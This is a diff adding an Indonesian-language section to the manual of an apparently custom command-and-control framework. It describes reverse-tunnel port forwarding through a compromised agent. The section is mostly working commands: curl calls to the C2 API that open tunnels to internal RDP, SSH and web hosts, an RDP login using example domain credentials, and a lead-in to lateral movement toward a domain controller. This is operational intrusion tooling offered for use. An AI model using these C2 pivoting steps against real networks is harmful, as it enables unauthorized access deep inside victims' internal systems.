@@ -324,6 +324,103 @@ Lihat [15 — Advanced Techniques](15-advanced.md) untuk operasi registry lengka
 
 ---
 
+## Port Forwarding (Reverse Tunnel)
+
+Port forwarding memungkinkan operator untuk mengakses satu port internal secara langsung
+melalui channel C2, tanpa perlu SOCKS5 client seperti proxychains.
+
+```
+Operator ──► localhost:LOCAL_PORT ──► C2 Server ──► (HTTP C2 channel) ──► Agent ──► TARGET:PORT
+```
+
+Cocok untuk: RDP satu host, koneksi database, HTTP internal app — ketika SOCKS5 terlalu
+berat atau tidak perlu full proxy.
+
+### Cara Kerja
+
+1. Operator mengirim perintah `portfwd` ke agent dengan target dan local port
+2. Server membuka TCP listener di `127.0.0.1:LOCAL_PORT`
+3. Agent mendial `TARGET:PORT` di network internal
+4. Data direlai bidireksional melalui dua HTTP endpoint (`/portfwd/:sess/pull` dan `/portfwd/:sess/push`)
+5. Operator konek ke `localhost:LOCAL_PORT` seolah konek langsung ke target
+
+### Start Port Forward
+
+```bash
+# Lewat API langsung
+curl -X POST http://IP:8080/api/v1/agent/2703886d/portfwd \
+  -H "Content-Type: application/json" \
+  -d '{"target":"192.168.1.10:3389","local_port":33899}'
+
+# Respons
+{
+  "session_id": "fwd-1",
+  "local_port": 33899,
+  "target": "192.168.1.10:3389",
+  "agent_id": "2703886d",
+  "command_id": "..."
+}
+```
+
+### Lihat Session Aktif
+
+```bash
+curl http://IP:8080/api/v1/portfwd
+# {"sessions":[{"agent_id":"2703886d","id":"fwd-1","local_port":33899,"target":"192.168.1.10:3389"}]}
+```
+
+### Stop Session
+
+```bash
+curl -X DELETE http://IP:8080/api/v1/portfwd/fwd-1
+```
+
+### Contoh: RDP ke Host Internal
+
+```bash
+# 1. Buat tunnel
+curl -X POST http://IP:8080/api/v1/agent/2703886d/portfwd \
+  -d '{"target":"192.168.1.10:3389","local_port":33899}'
+
+# 2. Tunggu agent eksekusi perintah (satu beacon interval)
+#    Lalu konek RDP ke local port
+xfreerdp /v:localhost:33899 /u:CORP\\john.doe /p:'P@ssw0rd'
+# atau di Windows:
+mstsc /v:localhost:33899
+```
+
+### Contoh: Akses Web Internal
+
+```bash
+curl -X POST http://IP:8080/api/v1/agent/2703886d/portfwd \
+  -d '{"target":"192.168.1.100:80","local_port":8888}'
+
+# Setelah tunnel aktif:
+curl http://localhost:8888/
+# atau buka di browser: http://localhost:8888
+```
+
+### Contoh: SSH ke Server Internal
+
+```bash
+curl -X POST http://IP:8080/api/v1/agent/2703886d/portfwd \
+  -d '{"target":"192.168.1.10:22","local_port":2222}'
+
+ssh -p 2222 admin@localhost
+```
+
+### Catatan
+
+| Aspek | Detail |
+|-------|--------|
+| Satu koneksi | Server hanya terima satu TCP conn per session |
+| Latency | Sebanding dengan beacon interval (HTTP pull setiap ~28 s long-poll) |
+| Buffer | Chunk 32 KB, antrian 64 entri masing-masing arah |
+| Stop session | `DELETE /portfwd/:sess` atau agent restart |
+| VS SOCKS5 | SOCKS5 lebih fleksibel (multi-target); portfwd lebih sederhana (satu target) |
+
+---
+
 ## Skenario Pivoting: Lateral Movement ke Domain Controller
 
 ```
